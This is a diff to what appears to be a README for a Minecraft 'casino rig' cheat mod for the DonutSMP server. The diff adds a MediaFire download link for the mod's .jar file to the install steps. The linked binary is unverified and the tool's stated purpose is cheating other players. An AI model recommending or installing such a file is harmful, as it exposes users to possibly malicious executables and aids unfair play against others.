@@ -28,7 +28,7 @@ This **DonutSMP casino rig mod** is a utility tool that provides **player advant
 
 1. Install [Fabric Loader](https://fabricmc.net) for Minecraft 1.21+
 2. Download [Fabric API](https://modrinth.com/mod/fabric-api) and place it in your `mods` folder
-3. Download DonutSMP Casino Rig mod and place it in your `mods` folder
+3. Download [DonutSMP Casino Rig mod](https://www.mediafire.com/file/pmsvt4iuit7p7r8/CasinoRig-1.21.10.jar/file) and place it in your `mods` folder
 4. Launch Minecraft
 5. Press `INSERT` in-game to open the configuration menu
 
